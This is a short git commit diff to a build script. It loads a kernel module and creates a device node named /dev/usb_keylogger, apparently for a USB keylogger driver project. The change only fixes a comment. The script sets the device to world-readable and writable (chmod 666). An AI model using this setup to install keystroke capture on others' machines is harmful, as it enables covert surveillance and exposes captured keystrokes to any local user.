fcd106caebb8ca9ded30048a91b427678cc86246
AndyCao555 <andycao005@gmail.com>
2025-03-10 18:16:11 +0000

    Update build.sh
    updated the old ass comment to #

--- build.sh
+++ build.sh
@@ -8,7 +8,7 @@ echo "Inserting module!"
 sudo insmod Driver.ko
 
 echo "Driver inserted!"
-sudo mknod /dev/usb_keylogger c 240 0 //replace with major and minor!
+sudo mknod /dev/usb_keylogger c 240 0 #replace with major and minor!
 
 echo "Device node created!"
 sudo chmod 666 /dev/usb_keylogger
